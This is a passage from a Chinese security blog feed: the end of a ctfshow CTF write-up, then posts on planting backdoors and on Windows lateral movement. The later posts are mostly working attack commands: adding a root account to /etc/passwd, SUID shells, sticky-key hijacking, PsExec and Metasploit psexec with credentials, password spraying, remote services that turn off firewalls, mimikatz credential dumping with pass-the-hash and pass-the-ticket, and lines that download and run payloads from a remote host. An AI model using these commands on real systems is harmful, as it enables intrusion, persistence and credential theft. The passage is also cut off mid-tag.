answer_one(sess):</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                i=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="You-and-me"><a class="header-anchor" href="#You-and-me">¶</a>You and me</h2><p>也是盲水印, 这次需要另一个<a href="https://github.com/chishaxie/BlindWaterMark">盲水印工具</a>, 安装依赖即可执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bwmforpy3.py decode you.png you_and_me.png flag.png</span><br></pre></td></tr></table></figure><h2 id="迅疾响应"><a class="header-anchor" href="#迅疾响应">¶</a>迅疾响应</h2><p>扫不出来?扫不出来就对了, 向你推荐<a href="https://merri.cx/qrazybox/">qrazybox</a>, 二维码<a href="https://blog.csdn.net/weixin_43513379/article/details/109203225">详解</a></p><p>New -&gt; Import from Image 导入之后 Tools -&gt; Extract QR information</p><p>flag只有一半, 在你详细了解过二维码之后, 你会知道填充是从右往左填充的, 而且纠错码会在数据之后. 既然没有别的方法了, 那就碰运气先删掉一部分的纠错码看看能不能将纠错机制部分删除, 拿到没有被纠错的部分</p><p>所以我把定时标志(Timing Pattern)左边的数据部分全部删掉了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623193220629.png" alt="image-20240623193220629"></p><p>此时再做扫描就能得到flag, 真帅吧</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623193312895.png" alt="image-20240623193312895"></p><h2 id="打不开的图片"><a class="header-anchor" href="#打不开的图片">¶</a>打不开的图片</h2><p>没有文件头, 没有文件尾, 简直就是乱码</p><p>附件名字叫做misc5.5.png, 而叫做misc5.png的附件是&quot;你会异或吗&quot;的附件, 那可能就是对整个文件进行了什么操作导致正常图片变成了这样</p><p>观察后发现, 本题文件头部分的二进制反转后加一就可以得到一个PNG头</p><p>十六进制运算 -&gt; 二进制反转 -&gt; 加一 -&gt; 保存就可以看到flag</p><blockquote><p>似乎有个求反运算, 我现在在想为什么他能通过<code>X[i]=-X[i]</code>直接得到求反加一</p></blockquote><h1>简单题</h1><h2 id="Web"><a class="header-anchor" href="#Web">¶</a>Web</h2><hr><h3 id="web2-c0me-t0-s1gn"><a class="header-anchor" href="#web2-c0me-t0-s1gn">¶</a>web2 c0me_t0_s1gn</h3><p>右键检查, 源码中还有两个提示:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ok you find something a part of flag :ctfshow&#123;We1c0me_ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>the page hide something you need use the god&#x27;s eye to find<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--and thre is a hint for another one: can can need 控制台(console)--&gt;</span></span><br></pre></td></tr></table></figure><p>控制台处输入对应函数即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try to run the function &quot;g1ve_flag()&quot;to get the flag!</span><br><span class="line"># t0_jo1n_u3_!&#125;</span><br></pre></td></tr></table></figure><h3 id="驷马难追"><a class="header-anchor" href="#驷马难追">¶</a>驷马难追</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">              <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">              <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">     &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试, URL编码中的字母不会被check函数检测出来, 所以就是直接用加法即可: ``?num=114514%2b1805296`</p><h3 id="TapTapTap"><a class="header-anchor" href="#TapTapTap">¶</a>TapTapTap</h3><p>是一个网页小游戏, html没什么好看的, 直接看该游戏仅有的一个``habibiScript.js`</p><p>直接搜索alert, 似乎得到一个游戏结束的输出</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( gameEngine.<span class="property">levelNum</span> &gt; <span class="number">20</span>) &#123;</span><br><span class="line">      toolsBox.<span class="title function_">hidePage</span>(pagePlayArea);</span><br><span class="line">      toolsBox.<span class="title function_">showPage</span>(pageLevelPassed);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">atob</span>(<span class="string">&#x27;WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=&#x27;</span>));</span><br><span class="line">      <span class="title function_">alert</span>(<span class="title function_">atob</span>(<span class="string">&#x27;WW91ciBmbGFnIGlzIGluIC9zZWNyZXRfcGF0aF95b3VfZG9fbm90X2tub3cvc2VjcmV0ZmlsZS50eHQ=&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">    gameEngine.<span class="title function_">updateLevel</span>(gameEngine.<span class="property">levelNum</span> + <span class="number">1</span>); <span class="comment">// Update level number in the game engine</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对其进行base64编码, 可以得到<code>Your flag is in /secret_path_you_do_not_know/secretfile.txt</code>, 打开就得到了flag</p><h3 id="传说之下-雾"><a class="header-anchor" href="#传说之下-雾">¶</a>传说之下(雾)</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Game</span> = <span class="keyword">new</span> <span class="title class_">Underophidian</span>(<span class="string">&#x27;gameCanvas&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> snakeAudio = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.snake-audio&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> gameMusic = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.game-music&#x27;</span>)</span><br><span class="line">    <span class="keyword">var</span> gameButton = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.game-button&#x27;</span>)</span><br></pre></td></tr></table></figure><p>查看js, 会发现游戏这个对象直接摆在脸上是Game, 而 score 是里面的一个变量</p><p>所以 开始游戏-&gt;暂停-&gt;控制台输入<code>Game.score=3000</code>, 然后吃掉一个果子, 控制台就会出现flag</p><h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2><hr><h3 id="杂项签到"><a class="header-anchor" href="#杂项签到">¶</a>杂项签到</h3><p>用winhex打开然后搜索ctfshow即可得到flag</p><h3 id="损坏的压缩包"><a class="header-anchor" href="#损坏的压缩包">¶</a>损坏的压缩包</h3><p>winhex打开发现是PNG头,改成png后缀打开得到flag</p><h3 id="7-1-05"><a class="header-anchor" href="#7-1-05">¶</a>7.1.05</h3><p>下载的是一个游戏的存档文件, 鼠鼠不想做了</p><h3 id="黑丝白丝还有什么丝"><a class="header-anchor" href="#黑丝白丝还有什么丝">¶</a>黑丝白丝还有什么丝</h3><p>你是西格玛男人, 鉴定为摩斯电码, 白丝为<code>.</code>黑丝为<code>-</code>转场为空格, 解码之后变成全大写就可以交了</p><p>手搓如下: <code>.-- ....- -. - - ----- -... ...-- -- --- .-. . -.-. ..- - .</code></p><h3 id="我吐了你随意"><a class="header-anchor" href="#我吐了你随意">¶</a>我吐了你随意</h3><p>0宽隐写, 塞进0宽字符<a href="https://330k.github.io/misc_tools/unicode_steganography.html">解码工具</a>即可</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 隐写 </tag>
            
            <tag> PyJail </tag>
            
            <tag> 整形溢出 </tag>
            
            <tag> 二维码 </tag>
            
            <tag> 文件操作 </tag>
            
            <tag> 盲水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后门技术</title>
      <link href="/article/how-to-create-backdoor/"/>
      <url>/article/how-to-create-backdoor/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>后门技术</h1><h2 id="Windows"><a class="header-anchor" href="#Windows">¶</a>Windows</h2><ol><li>隐藏, 克隆账户<code>test$</code>, 在命令行,控制面板的用户管理和注册表查询</li><li>shift后门, 这个经常是win7出现的粘滞键后门具体操作就是将C盘windows目录下面的system32文件夹里面的<code>sethc.exe</code>应用程序进行转移，并生成<code>sethc.exe.bak</code>文件。并将<code>cmd.exe</code>拷贝覆盖<code>sethc.exe</code>解决方法可以检查现在这个叫做<code>sethc.exe</code>的文件的MD5的值是不是<code>cmd.exe</code>的值或者查看属性</li></ol><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -hashfile filename MD5</span><br></pre></td></tr></table></figure><ol start="3"><li>启动项和计划任务等启动项: windows-开始-所有程序-启动组策略: gpedit.msc计划任务: windows-开始-所有程序-附件-系统工具-任务计划程序</li><li>劫持技术所谓的映像劫持就是Image File Execution Options（IFEO）,位于注册表的<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>查找方式 ：这个注册项中有恶意的键值对就需要排查0</li><li>Powershell后门<a href="https://github.com/AV1080p/Schtasks-Backdoor">如何创建</a>检测比较简单,查看进程中是否有powershell的常驻进程</li><li>远控软件只能通过进程分析和流量分析才可以找到木马了</li><li>嗅探技术直接找进程</li></ol><h2 id="Linux"><a class="header-anchor" href="#Linux">¶</a>Linux</h2><ol><li>增加超级用户</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mx7krshell:x:0:0::/:/bin/sh&quot;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><ol start="2"><li>破解/嗅控用户密码查看进程基本上就能抓到恶意进程</li><li>放置SUID Shell</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/bash /dev/.rootshell</span><br><span class="line"><span class="built_in">chmod</span> u+s /dev/.rootshell</span><br><span class="line"><span class="comment"># 下面的命令用于查找系统中设置了SUID权限的文件</span></span><br><span class="line">find / -perm +4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ld &#123;&#125; \;  <span class="comment"># 查找设置了SUID权限的文件</span></span><br><span class="line">find / -perm +6000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ld &#123;&#125; \;  <span class="comment"># 上面的-6000表示既具有suid权限又具有sgid权限的文件</span></span><br></pre></td></tr></table></figure><ol start="4"><li>利用系统服务程序</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 修改/etc/inetd.conf</span><br><span class="line">daytime stream tcp nowait /bin/sh sh –I</span><br><span class="line"># 用trojan程序替换in.telnetd、in.rexecd等 inted的服务程序重定向login程序</span><br></pre></td></tr></table></figure><p>检查方式: 查看配置文件和文件MD55. TCP/UDP/ICMP ShellPing Backdoor, 通过ICMP包激活后门,形成一个Shell通道TCP ACK数据包后门, 可以穿过防火墙Linux下的ICMP Shell后门比较容易被发现 <a href="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py">网址</a>检查方式: 也是查看进程, 但是Linux的进程是可以隐藏的6. Crontab定时任务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l <span class="comment">#查看服务</span></span><br></pre></td></tr></table></figure><h2 id="通用"><a class="header-anchor" href="#通用">¶</a>通用</h2><ol><li>查询在线登录的人Linux: <code>w</code>Windows: <code>query user</code></li><li>病毒样本分析可以交给<a href="https://x.threatbook.com/">微步</a>或者另一个<a href="https://www.virustotal.com/gui/home/upload">网站</a>进行检测,还可以得到病毒的C2地址</li><li>ip溯源/分析微步继续上分</li><li>域名溯源</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> 工具利用 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动</title>
      <link href="/article/lateral-movement/"/>
      <url>/article/lateral-movement/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>横向移动</h1><p>攻击者获得对网络第一台计算机的访问权后, 在整个网络中移动, 以便访问受害组织的敏感信息和用户信息</p><blockquote><p>例如, 通过横向移动进行侦察可以帮助网络攻击者了解如何加密或泄露敏感数据, 具体取决于哪些机器传输的信息量最大它还可以揭示网络上的哪些机器可能持有帐户或<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E7%BD%91&amp;spm=1001.2101.3001.7020">子网</a>数据, 如何提升权限以获得管理或系统访问权限, 或者密码可能存储在何处</p></blockquote><p>非常常用, 因为可以了解有关受害组织网络的大量信息, 即使在一台设备上被检测到, 也可以继续通过该网的其他设备继续攻击</p><p>我们可以使用标准管理协议(例如 WinRM、RDP、VNC 或 SSH)连接到网络上的其他计算机必须注意不要尝试可疑的连接, 尝试藏在正常的连接中</p><h2 id="管理员和UAC"><a class="header-anchor" href="#管理员和UAC">¶</a>管理员和UAC</h2><p>用户帐户控制 (UAC), 就是那个点安装包会屏幕变暗弹出窗口的那个程序</p><p>UAC在默认情况下限制本地管理员权限, 对于远程连接执行管理任务的情况, 本地管理员账户不能直接进行，除非通过远程桌面协议(RDP)进行交互式会话, 唯一能够获得全权限的本地账户是默认的管理员账户, 启用后不受UAC的限制而拥有本地管理权限的域账户, 这些域账户登录的时候也会得到完全的管理权限, 不受UAC的限制</p><h1>创建远程会话</h1><p>已知凭证的前提下, 可以利用凭证移动</p><h2 id="psexec登录"><a class="header-anchor" href="#psexec登录">¶</a>psexec登录</h2><p>在有权访问的PC上远程运行命令, 躲避检测无视杀毒软件, 直接system权限</p><blockquote><p>445/TCP端口开放(SMB服务)知道管理员账号密码(组成员身份为管理员)</p></blockquote><h3 id="PsExec-exe工具"><a class="header-anchor" href="#PsExec-exe工具">¶</a>PsExec.exe工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /netonly /user:SUN\users cmd.exe// 凭据注入(runas命令)</span><br></pre></td></tr></table></figure><p><code>/netonly</code>是一个参数，表示你提供的用户凭据只用在网络验证中，本地登录还是使用你当前的用户身份<code>SUN\users</code>最好是拥有管理员身份的组成员(未验证)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec.exe /s cmd// 本地提权, 直接system权限</span><br><span class="line">PsExec.exe \127.0.0.1 -u Administrator -p 123qwe@@ /s cmd // 本地提权</span><br><span class="line">PsExec.exe \172.16.1.132 -u Administrator -p 123qwe@@ /s cmd // 横向入侵Windows主机，直接system权限</span><br><span class="line">PsExec64.exe \\172.16.1.132 -u Administrator -p 123qwe@@ -i  cmd.exe// 同上</span><br></pre></td></tr></table></figure><h3 id="Metasploit的psexec模块"><a class="header-anchor" href="#Metasploit的psexec模块">¶</a>Metasploit的psexec模块</h3><p>已知管理员凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.138.138</span><br><span class="line">set smbdomain SUN</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass dc321.com</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>未知凭据用密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 172.16.1.132</span><br><span class="line">set smbuser user.txt</span><br><span class="line">set smbpass password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>密码喷洒指的是用一个密码对多个账号对目标进行枚举爆破，躲避密码输入错误过多导致封锁账号</p></blockquote><p>还有impacket套件, cs插件-psexec, <a href="http://smbexec.py">smbexec.py</a></p><h2 id="IPC-连接"><a class="header-anchor" href="#IPC-连接">¶</a>IPC$连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\target_ip /u:user passwd</span><br><span class="line">net use \\192.168.138.138\ipc$ &quot;dc321.com&quot; /user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure><p>可以查看文件, 可以上传文件, 甚至可以用sc命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy b.exe \\target_ip\C$\tmp// 复制到目标机</span><br></pre></td></tr></table></figure><h2 id="sc命令"><a class="header-anchor" href="#sc命令">¶</a>sc命令</h2><blockquote><p>135/TCP139/TCP445/TCP已知组成员身份为管理员的账号密码</p></blockquote><h3 id="smbclient上传文件"><a class="header-anchor" href="#smbclient上传文件">¶</a>smbclient上传文件</h3><p>木马制作并上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient  //10.10.101.3/share -U smbuser</span><br><span class="line">smbclient -U users -W ZA &#x27;//10.200.48.201/C$/&#x27; passwd</span><br><span class="line"># -W 指定工作群组名称</span><br></pre></td></tr></table></figure><p>进入后可以用<code>put 1.txt</code>上传文件</p><h3 id="运行服务指定文件"><a class="header-anchor" href="#运行服务指定文件">¶</a>运行服务指定文件</h3><p>通常和反弹shell一起用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\10.200.48.201 create badservice binPath= &quot;C:\tmp\a.exe&quot; start= auto</span><br><span class="line">sc \\10.200.48.201 start badservice</span><br><span class="line">// 运行服务</span><br></pre></td></tr></table></figure><h3 id="关闭对面防火墙"><a class="header-anchor" href="#关闭对面防火墙">¶</a>关闭对面防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\192.168.138.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">// 创建关闭防火墙的服务</span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br><span class="line">// 立即启动服务</span><br></pre></td></tr></table></figure><h2 id="schtask命令-计划任务"><a class="header-anchor" href="#schtask命令-计划任务">¶</a>schtask命令(计划任务)</h2><blockquote><p>win版本大于2008必须要管理员</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /s target_ip /U  user  /P passwd /RU &quot;SYSTEM&quot; /create /tn &quot;任务名&quot; /tr &quot;1.exe&quot; /sc minute /mo 1</span><br><span class="line">// SYSTEM身份运行, 每分钟运行一次</span><br><span class="line">schtasks /s target_ip /U  user  /P passwd /run /tn &quot;任务名&quot; // 直接执行任务</span><br><span class="line">schtasks /s target_ip /U user /P passwd /tn &quot;任务名&quot; /DELETE /F// 删除计划任务</span><br></pre></td></tr></table></figure><h1>使用WMI横向移动</h1><p>WMI, 即Windows Management Instrumentation, 可以用于管理Windows系统和网络环境, 它支持远程操作, 因此在一些场景下常被用作横向移动的方法, 其通过135端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹</p><p>使用WMI可以用PowerShell连接,或者直接用wmic命令(cmd)</p><h2 id="远程创建进程"><a class="header-anchor" href="#远程创建进程">¶</a>远程创建进程</h2><blockquote><p>135/TCP5985/TCP或5986/TCP (WinRM HTTP/HTTPS)已知管理员用户名和密码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /user:SUN\user /password:passwd /node:10.200.48.201 process call create &quot;cmd.exe /c 1.exe&quot; </span><br><span class="line">// 1.exe 为 MSF生成的木马, 使用WMIC运行该文件</span><br></pre></td></tr></table></figure><p>远程创建服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:&quot;&lt;目标机器的IP地址&gt;&quot; /user:&quot;&lt;用户名&gt;&quot; /password:&quot;&lt;密码&gt;&quot; service call create &quot;&lt;服务名&gt;&quot;, &quot;&lt;完整路径到可执行文件&gt;&quot;</span><br></pre></td></tr></table></figure><p>安装MSI包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:&quot;&lt;目标机器的IP地址&gt;&quot; /user:&quot;&lt;用户名&gt;&quot; /password:&quot;&lt;密码&gt;&quot; product call install true,&quot;&quot; ,&quot;&lt;MSI包的完整网络路径&gt;&quot;</span><br></pre></td></tr></table></figure><p>远程创建计划任务(wmis不直接支持)</p><p>wmiexec-impacket工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp; c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><h1>票据传输</h1><p>原理: NTML验证和Kerberos验证</p><h2 id="mimikatz工具"><a class="header-anchor" href="#mimikatz工具">¶</a>mimikatz工具</h2><blockquote><p>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege(20) c0000061Mimikatz试图提升自身的特权，但没有成功。错误信息&quot;RtlAdjustPrivilege(20) c0000061&quot;中的&quot;20&quot;表示&quot;SeDebugPrivilege&quot;，也就是调试特权，“c0000061&quot;代表&quot;试图进行的操作不被允许”</p></blockquote><p>权限不够?扬了! PowerShell执行如下命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start-Process powershell -Verb runAs</span><br><span class="line">// 在PowerShell中启动一个新的PowerShell进程，并且这个新进程将以Administrator（管理员）身份运行</span><br></pre></td></tr></table></figure><p>提升当前进程的调试特权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate// 提升到最高权限system</span><br></pre></td></tr></table></figure><h3 id="票据收集"><a class="header-anchor" href="#票据收集">¶</a>票据收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam// 本地用户哈希值</span><br><span class="line">sekurlsa::msv// 最近登录域用户的哈希值(主要是NTLM)</span><br><span class="line">sekurlsa::ekeys// Kerberos加密密钥</span><br></pre></td></tr></table></figure><p>传递方式共三种,PTH,PTT,PTK</p><h2 id="PTH-传递哈希"><a class="header-anchor" href="#PTH-传递哈希">¶</a>PTH(传递哈希)</h2><h3 id="NTLM哈希注入"><a class="header-anchor" href="#NTLM哈希注入">¶</a>NTLM哈希注入</h3><p>通过票据收集得到的哈希值可以进行登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:用户名 /domain:域名 /ntlm:NTLM的哈希值 /run:&quot;执行的命令&quot;</span><br><span class="line">sekurlsa::pth /user:用户名 /domain:域名 /ntlm:NTLM的哈希值 /run:&quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>然后就可以在弹出窗口内读数据啥的</p><h3 id="winrs"><a class="header-anchor" href="#winrs">¶</a>winrs</h3><blockquote><p>为什么叫做移动到目标机子?</p></blockquote><p>也可以使用winrs而不指定任何凭据, 并且它将使用当前会话可用的凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs.exe -r:THMIIS.za.tryhackme.com cmd</span><br><span class="line">winrs -r:THMIIS.za.tryhackme.com cmd</span><br></pre></td></tr></table></figure><p>然后就是sc,IPC$等</p><h2 id="PTT-传递票据"><a class="header-anchor" href="#PTT-传递票据">¶</a>PTT(传递票据)</h2><p>mimikatz可以查看和修改票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::list</span><br><span class="line">kerberos::purge # 清除票据</span><br></pre></td></tr></table></figure><p>单纯用cmd也行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line">klist purge # 清除票据</span><br></pre></td></tr></table></figure><blockquote><p>在没有票据的时候可以看见，不能列出目标机子的文件，原因是没有票据 TGT</p></blockquote><h3 id="票据注入"><a class="header-anchor" href="#票据注入">¶</a>票据注入</h3><p>导出票据, 通常需要 SYSTEM 权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>得到的文件会非常长</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0;97d82]-2-0-40e10000-t2_felicia.dean@krbtgt-ZA.TRYHACKME.COM.kirbi</span><br><span class="line">|_________| ^ |____________| |______________| |_______________________________||_____|</span><br><span class="line">    |            |            |                    |                                     |                             |______文件文件扩展名</span><br><span class="line">    |            |            |                    |                                     |</span><br><span class="line">    |            |            |                    |                                     |______resource</span><br><span class="line">    |            |            |                    |</span><br><span class="line">    |            |            |                    |______用户/计算机帐户（票证所有者）</span><br><span class="line">    |            |            |</span><br><span class="line">    |            |            |______0x40e10000 kerberos 标志 [1]</span><br><span class="line">    |            |</span><br><span class="line">    |            |______Kerberos 票证类型</span><br><span class="line">    |                      0 = TGS / 1 = Client ticket / 2 = TGT</span><br><span class="line">    |</span><br><span class="line">    |__________0x97d82 user LUID [2]</span><br></pre></td></tr></table></figure><p>大多数时候, 我们只需要TGT票据, 因为它们可用于请求访问允许用户访问的任何服务, TGS仅适用于特定服务</p><p>注入TGT:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 都在mimikatz执行</span><br><span class="line">kerberos::ptt [0;525fb0]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi</span><br><span class="line">kerberos::list// 查看是否注入成功</span><br></pre></td></tr></table></figure><p>使用winrs命令, 它将自动已有的票据注入到命令中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:target cmd</span><br></pre></td></tr></table></figure><p>然后就可以执行命令了</p><h2 id="PTK-传递密钥"><a class="header-anchor" href="#PTK-传递密钥">¶</a>PTK(传递密钥)</h2><p>和PYH类似, 但是适用于Kerberos验证</p><h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3><p>当用户请求TGT时, 他们会发送使用从其密码派生的加密密钥加密的时间戳, 用于派生此密钥的算法具体取决于安装的 Windows 版本和 Kerberos 配置</p><p>如果我们拥有这些密钥中的任何一个, 我们可以向 KDC 请求 TGT, 而无需实际密码, 因此名称为“传递密钥”(PTK)</p><p>mimikatz抓取密钥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot; &gt; log.txt</span><br></pre></td></tr></table></figure><p>关注点主要是 RC4 哈希、AES128 哈希 、AES256 哈希</p><p>如果有RC4 哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:&quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>如果是AES256 哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:&quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>如果是AES128 哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes128:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:&quot;cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>然后执行命令确认,随后可以移动到对方的机子</p><h1>滥用用户行为</h1><blockquote><p>攻击者发现全局可写共享攻击者发现允许访问可写共享的凭据</p></blockquote><h2 id="VBS脚本"><a class="header-anchor" href="#VBS脚本">¶</a>VBS脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\MY-IP\share_name\payload.exe %tmp% &amp; %tmp%\payload&quot;, 0, True</span><br><span class="line">// 从远程服务器获取&quot;payload.exe&quot;保存到本地临时文件夹并运行它, 而且命令执行的过程中不会弹出任何窗口,并在启动程序之前等待复制完成</span><br></pre></td></tr></table></figure><h2 id="EXE后门"><a class="header-anchor" href="#EXE后门">¶</a>EXE后门</h2><p>就是放个msf木马顶替正常exe文件</p><h2 